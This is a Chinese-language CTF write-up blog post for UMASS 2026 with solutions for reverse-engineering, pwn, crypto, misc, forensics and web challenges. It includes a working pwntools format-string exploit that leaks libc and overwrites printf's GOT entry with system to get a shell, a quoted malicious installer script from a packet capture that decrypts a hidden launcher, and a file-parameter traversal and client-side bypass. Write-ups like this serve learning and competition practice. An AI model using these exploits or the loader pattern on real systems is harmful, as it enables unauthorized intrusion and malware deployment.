@@ -1,0 +1,211 @@
+<!DOCTYPE html><html lang="zh-TW"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#496b8c"><meta name="description" content="bios021"><meta name="author" content="John Doe"><meta name="generator" content="Hexo 8.1.1"><title>UMASS2026 writeup | bios021</title><link rel="stylesheet" href="/css/hsad-theme.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"><script src="/js/hsad-theme.js" defer></script></head><body class="view-inner view-post"><div class="reading-progress" aria-hidden="true"><span class="reading-progress__bar" data-reading-progress></span></div><div class="page-aura page-aura--one"></div><div class="page-aura page-aura--two"></div><div class="site-shell"><aside class="site-sidebar"><section class="sidebar sidebar--desktop"><div class="sidebar__backdrop" style="background-image:url(/images/background.png)"></div><div class="sidebar__overlay"></div><div class="sidebar__content"><a class="sidebar__brand" href="/"><img class="sidebar__avatar" src="/images/avatar.jpg" alt="John Doe"><div class="sidebar__identity"><h2 class="sidebar__title">bios021</h2><p class="sidebar__subtitle">窩不知道</p></div></a><p class="sidebar__description">大概是某種倉庫吧。</p><nav class="sidebar__nav" aria-label="Primary"><a href="/">首頁</a><a href="/archives/">檔案</a><a href="/categories/">分類</a><a href="/tags/">標籤</a><a href="/about/">關於</a></nav><div class="sidebar__social"><a href="https://github.com/bios021" target="_blank" rel="noopener">GitHub</a><a href="mailto:jimmij7887@gmail.com" target="_blank" rel="noopener">E-Mail</a></div></div></section></aside><div class="mobile-topbar"><button class="mobile-topbar__toggle js-drawer-toggle" type="button" aria-label="Open navigation"><span></span><span></span><span></span></button><a class="mobile-topbar__title" href="/">bios021</a><a class="mobile-topbar__avatar" href="/"><img src="/images/avatar.jpg" alt="John Doe"></a></div><div class="mobile-drawer" data-drawer aria-hidden="true"><div class="mobile-drawer__panel"><section class="sidebar sidebar--mobile"><div class="sidebar__backdrop" style="background-image:url(/images/background.png)"></div><div class="sidebar__overlay"></div><div class="sidebar__content"><a class="sidebar__brand" href="/"><img class="sidebar__avatar" src="/images/avatar.jpg" alt="John Doe"><div class="sidebar__identity"><h2 class="sidebar__title">bios021</h2><p class="sidebar__subtitle">窩不知道</p></div></a><p class="sidebar__description">大概是某種倉庫吧。</p><nav class="sidebar__nav" aria-label="Primary"><a href="/">首頁</a><a href="/archives/">檔案</a><a href="/categories/">分類</a><a href="/tags/">標籤</a><a href="/about/">關於</a></nav><div class="sidebar__social"><a href="https://github.com/bios021" target="_blank" rel="noopener">GitHub</a><a href="mailto:jimmij7887@gmail.com" target="_blank" rel="noopener">E-Mail</a></div></div></section></div></div><div class="mobile-backdrop js-drawer-close"></div><main class="site-main"><div class="article-layout article-layout--with-toc"><article class="article"><header class="article__header"><div class="article__eyebrow"><a href="/categories/writeup/">writeup</a></div><h1 class="article__title">UMASS2026 writeup</h1><div class="article__meta"><time datetime="2026-04-13T05:41:31.000Z">2026-04-13</time><span class="article__divider">/</span><span>更新於 2026-04-13</span></div><div class="article__tags"><a class="article__tag" href="/tags/ctf/">ctf</a><a class="article__tag" href="/tags/rev/">rev</a><a class="article__tag" href="/tags/cryto/">cryto</a><a class="article__tag" href="/tags/pwn/">pwn</a><a class="article__tag" href="/tags/misc/">misc</a><a class="article__tag" href="/tags/web/">web</a><a class="article__tag" href="/tags/forensics/">forensics</a></div></header><div class="article__content"><p>原本想認真地打兩天但因為第二天頭在痛基本上等於我只有打一天，還全都只是100分的題目&#x3D;&#x3D;</p>
+<img src="/2026/04/13/UMASS2026-writeup/score.png" class="">
+<p>總之成績挺普通的</p>
+<h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><h3 id="Batcave-Bitflip"><a href="#Batcave-Bitflip" class="headerlink" title="Batcave Bitflip"></a>Batcave Bitflip</h3><img src="/2026/04/13/UMASS2026-writeup/rev1.png" class="">
+<p>就輸入加密比對，直接把verify、decrypt裡的目標抓下來做decrypt，題目敘述提到有小bug，把decrypt裡的or改成xor就好了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+corec<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x3b</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0xaf</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xc5</span><span class="token punctuation">,</span> <span class="token number">0xe4</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xd3</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xde</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xab</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xc7</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0xee</span><span class="token punctuation">]</span>
+flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x6e</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xb4</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0x8c</span><span class="token punctuation">,</span> <span class="token number">0xe6</span><span class="token punctuation">,</span> <span class="token number">0xe6</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xe9</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0x2e</span><span class="token punctuation">,</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0xe3</span><span class="token punctuation">,</span> <span class="token number">0xc4</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> corec<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+
+flag_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+
+text <span class="token operator">=</span> flag_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+flag: UMASS{__p4tche5_0n_p4tche$__#}
+
+
+
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Brick-City-Office-Space"><a href="#Brick-City-Office-Space" class="headerlink" title="Brick City Office Space"></a>Brick City Office Space</h3><img src="/2026/04/13/UMASS2026-writeup/pwn1.png" class="">
+<p>一題format string，我是想辦法挖出put的位置，更新libc，把got表裡的printf改成system，最後輸入&#x2F;bin&#x2F;sh，直接進去拿flag</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#context.log_level='debug'</span>
+
+r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'brick-city-office-space.pwn.ctf.umasscybersec.org'</span><span class="token punctuation">,</span> <span class="token number">45001</span><span class="token punctuation">)</span>
+<span class="token comment">#r=process('./BrickCityOfficeSpace')</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./BrickCityOfficeSpace'</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"%4$s"</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'pace> '</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+leaked_bytes <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+puts_real_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>leaked_bytes<span class="token punctuation">)</span> 
+
+libc<span class="token punctuation">.</span>address <span class="token operator">=</span> puts_real_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"/n)\n"</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"y"</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'pace> '</span><span class="token punctuation">)</span>
+
+writes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span>
+overwrite_payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> writes<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>overwrite_payload<span class="token punctuation">)</span>
+
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"/n)\n"</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"y"</span><span class="token punctuation">)</span>
+
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'pace> '</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>flag: UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}</p>
+<h2 id="Brick-Workshop"><a href="#Brick-Workshop" class="headerlink" title="Brick Workshop"></a>Brick Workshop</h2><img src="/2026/04/13/UMASS2026-writeup/pwn2.png" class="">
+<p>輸入兩個數字，運算和驗證，從圖中能發現因為有&amp;0x43的關係導致((mold_id &gt;&gt; 2) &amp; 0x43u)注定不會很大，因此這題能直接化簡成3*x&#x3D;0x23ccd，最後直接輸入0 48879即可<br>flag: UMASS{brickshop_calibration_reuses_your_last_batch} </p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="The-Accursed-Lego-Bin"><a href="#The-Accursed-Lego-Bin" class="headerlink" title="The Accursed Lego Bin"></a>The Accursed Lego Bin</h3><p>對不起我直接靠ai了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random
+<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> iroot
+
+enc_seed <span class="token operator">=</span> <span class="token number">27853968878118202600616227164274184566757028924504378904793832254042520819991144639702067205911203237440164930417495337197532501173607130020895075421529488925453640401673956438276491981209692168887241600331323119747563338336714474549971016558306628074198388772585672217715120627041791075104601103026751194857235765309608359123653353317678322176850235969280946203083455072140605141795053378439195293814791874092411691470992665912679118059266672118104677436338717139016415491690881114160151442145485980845723522027034166250144387200630948484934412980402141190370298072772878692178174395473352346736568834853932546775351591579301264010616662074516876263415244325179769805404580595987957830206775099221681479552297343673953519347816803686755315058241114932909715588571465125584675910868587612361307253375806962785674201551995414052898626175776112925401104907258409223265509906782478388392655489350014728299523474441953620142576405825798349964376116586305354010422094308152856531053593521850744465605649669069637606613192817098670399196448110611736116364403445860585755736974514672765253945103150765043635481842335038685418842068710568699703147745504514090439</span> <span class="token comment"># 貼上 seed = XXX</span>
+enc_flag_hex <span class="token operator">=</span> <span class="token string">"a9fa3c5e51d4cea498554399848ad14aa0764e15a6a2110b6613f5dc87fa70f17fafbba7eb5a2a5179"</span> <span class="token comment"># 貼上 flag = XXX</span>
+
+seed<span class="token punctuation">,</span> exact <span class="token operator">=</span> iroot<span class="token punctuation">(</span>enc_seed<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token keyword">not</span> exact<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"failed"</span><span class="token punctuation">)</span>
+
+flag_bits_enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+flag_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>enc_flag_hex<span class="token punctuation">)</span>
+<span class="token keyword">for</span> byte <span class="token keyword">in</span> flag_bytes<span class="token punctuation">:</span>
+    flag_bits_enc<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+indices <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag_bits_enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>indices<span class="token punctuation">)</span>
+
+original_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag_bits_enc<span class="token punctuation">)</span>
+<span class="token keyword">for</span> shuffled_idx<span class="token punctuation">,</span> original_idx <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>indices<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    original_bits<span class="token punctuation">[</span>original_idx<span class="token punctuation">]</span> <span class="token operator">=</span> flag_bits_enc<span class="token punctuation">[</span>shuffled_idx<span class="token punctuation">]</span>
+
+flag_str <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>original_bits<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    byte_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>original_bits<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    flag_str <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>byte_str<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag_str<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>flag: UMASS{tH4Nk5_f0R_uN5CR4m8L1nG_mY_M3554g3}</p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Deep-Down"><a href="#Deep-Down" class="headerlink" title="Deep Down"></a>Deep Down</h3><p>載下來發現是一張gif，丟進stegsolve亂按了幾下</p>
+<img src="/2026/04/13/UMASS2026-writeup/misc1.png" class="">
+<p>??ok<br>flag: UMASS{1N_A_G1774}</p>
+<h3 id="Take-a-Slice"><a href="#Take-a-Slice" class="headerlink" title="Take a Slice"></a>Take a Slice</h3><p>抓下來的檔案file說是data，拿去問ai得到的回應是這應該是stl檔，改名後找個online viewer打開看表面並沒甚麼特別的，忽然想到題目的slice於是就試著做切片，果然發現裡面有東西</p>
+<img src="/2026/04/13/UMASS2026-writeup/misc2.png" class="">
+<p>flag: UMASS{SL1C3_&amp;_D1C3} </p>
+<h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><h3 id="Click-Here-For-Free-Bricks"><a href="#Click-Here-For-Free-Bricks" class="headerlink" title="Click Here For Free Bricks"></a>Click Here For Free Bricks</h3><p>這題要在pcap檔裡找到一個malware，利用http stream follow能找到一段可疑的下載(二進位的部分我就不貼出來了)</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;launcher HTTP&#x2F;1.1
+Host: 156.234.52.16
+User-Agent: python-requests&#x2F;2.31.0
+Accept-Encoding: gzip, deflate, br
+Accept: *&#x2F;*
+Connection: keep-alive
+
+
+HTTP&#x2F;1.0 200 OK
+Server: SimpleHTTP&#x2F;0.6 Python&#x2F;3.12.3
+Date: Sat, 04 Apr 2026 21:43:43 GMT
+Content-type: application&#x2F;octet-stream
+Content-Length: 13222
+Last-Modified: Sat, 04 Apr 2026 21:40:06 GMT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;installer.py HTTP&#x2F;1.1
+Host: 156.234.52.16
+User-Agent: python-requests&#x2F;2.31.0
+Accept-Encoding: gzip, deflate, br
+Accept: *&#x2F;*
+Connection: keep-alive
+
+
+HTTP&#x2F;1.0 200 OK
+Server: SimpleHTTP&#x2F;0.6 Python&#x2F;3.12.3
+Date: Sat, 04 Apr 2026 21:43:13 GMT
+Content-type: text&#x2F;x-python
+Content-Length: 614
+Last-Modified: Sat, 04 Apr 2026 21:11:16 GMT
+
+import subprocess
+import subprocess
+import hashlib
+import nacl.secret
+
+def fix_error():
+    seed &#x3D; &quot;38093248092rsjrwedoaw3&quot;
+    key &#x3D; hashlib.sha256(seed.encode()).digest()
+    box &#x3D; nacl.secret.SecretBox(key)
+    with open(&quot;.&#x2F;launcher&quot;, &quot;rb&quot;) as f:
+        data &#x3D; f.read()
+    decrypted &#x3D; box.decrypt(data)
+    with open(&quot;.&#x2F;launcher&quot;, &quot;wb&quot;) as f:
+        f.write(decrypted)
+
+print(&quot;Hello World&quot;)
+
+try:
+    fix_error()
+    print(&quot;Installed Correctly&quot;)
+    result &#x3D; subprocess.run([&quot;ping&quot;, &quot;-c&quot;, &quot;2&quot;, &quot;76.54.32.144&quot;])
+    print(result)
+
+except Exception as e:
+    print(f&quot;Installation failed, please try again &#123;e&#125;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>載下launcher，依據installer來寫出decrypt</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> nacl<span class="token punctuation">.</span>secret
+
+seed <span class="token operator">=</span> <span class="token string">"38093248092rsjrwedoaw3"</span>
+key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>seed<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+box <span class="token operator">=</span> nacl<span class="token punctuation">.</span>secret<span class="token punctuation">.</span>SecretBox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"launcher"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        encrypted_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    decrypted_data <span class="token operator">=</span> box<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encrypted_data<span class="token punctuation">)</span>
+
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"launcher_decrypted"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decrypted_data<span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] succeed！real malware: 'launcher_decrypted'"</span><span class="token punctuation">)</span>
+<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最後拿去virustotal上找<br>flag: UMASS{e7a09064fc40dd4e5dd2e14aa8dad89b328ef1b1fdb3288e4ef04b0bd497ccae}</p>
+<p>題外話:</p>
+<img src="/2026/04/13/UMASS2026-writeup/what.png" class="">
+<p>這都是些啥阿</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Brick-by-Brick"><a href="#Brick-by-Brick" class="headerlink" title="Brick by Brick"></a>Brick by Brick</h3><p>打開robots.txt能看到一些東西</p>
+<pre class="line-numbers language-none"><code class="language-none">User-agent: *
+Disallow: &#x2F;internal-docs&#x2F;assembly-guide.txt
+Disallow: &#x2F;internal-docs&#x2F;it-onboarding.txt
+Disallow: &#x2F;internal-docs&#x2F;q3-report.txt
+
+# NOTE: Maintenance in progress. 
+# Unauthorized crawling of &#x2F;internal-docs&#x2F; is prohibited.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在it-onborading.txt能用?file&#x3D;???來看file，並且發現有config.php，打開發現有&#x2F;dashboard-admin.php，又打開就發現</p>
+<img src="/2026/04/13/UMASS2026-writeup/web1.png" class="">
+<p>flag: UMASS{4lw4ys_ch4ng3_d3f4ult_cr3d3nt14ls} </p>
+<h3 id="BrOWSER-BOSS-FIGHT"><a href="#BrOWSER-BOSS-FIGHT" class="headerlink" title="BrOWSER BOSS FIGHT"></a>BrOWSER BOSS FIGHT</h3><p>一打開是一個需要key才能進去的城堡，有一段js會修改我的輸入</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'key-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> knockOnDoor <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// It replaces whatever they typed with 'WEAK_NON_KOOPA_KNOCK'</span>
+    knockOnDoor<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"WEAK_NON_KOOPA_KNOCK"</span><span class="token punctuation">;</span> 
+    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>打開burp來繞過，</p>
+<img src="/2026/04/13/UMASS2026-writeup/web2.png" class="">
+<p>這裡還提醒我該用什麼key，成功進去之後網頁空到一度沒甚麼想法，但無聊打開cache之後發現居然有hasAxe，修改並刷新之後flag就出來了<br>flag: UMASS{br0k3n_1n_2_b0wz3r5_c4st13}</p>
